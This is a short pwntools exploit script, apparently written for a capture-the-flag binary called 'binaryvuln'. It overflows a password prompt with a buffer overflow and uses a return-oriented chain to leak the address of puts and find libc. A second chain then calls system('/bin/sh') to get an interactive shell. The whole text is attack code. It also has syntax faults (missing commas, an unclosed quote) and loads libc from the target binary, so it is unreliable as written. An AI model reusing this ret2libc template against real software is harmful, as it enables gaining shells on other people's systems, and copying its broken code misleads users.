#!/usr/bin/python2.7

from pwn import *

elf = ELF('./binaryvuln')
libc = ELF('./binaryvuln', checksec = False)

context.terminal = ['tmux', 'sp', '-h']
context.log_level = 'DEBUG'

io = process(elf.path, stdin = PTY)

leak = flat(
	'A' * 136 #Offset
	0x40179b #pop rdi
	elf.got['puts'] #call PLT asking for puts()
	elf.sym['puts'], #call puts()
	0x401016,
	0x401170, #Use this as starting mem postion of main() to repeat the execution
	endianness = 'little', word_size = 64, sign = False)

io.sendlineafter('access password: ',leak)
io.recvuntil('denied.\n')
leak = u64(io.recvline()[:-1].ljust(8, '\x00'))
libc.address = leak - libc.sym['puts']

log.success('Leaked puts@@LIBC: ' + hex(leak))
log.success('Leaked libc address: ' + hex(libc.address))
log.success('Leaked system address: ' + hex(libc.sym['system]))
log.success('Leaked /bin/sh address: ' + hex(libc.search('/bin/sh').next()))

libc_system = libc.sym['system']
libc_binsh = libc.search('/bin/sh').next()

shell = flat(
	'A' * 136,
	0x40179b, #: pop rdi ; ret
	libc_binsh,
	0x401016, # Ret
	libc_system,
	endianness = 'little', word_size = 64, sign = False)

io.sendlineafter('access password: ', shell)
io.recv()
io.interactive()
io.close()
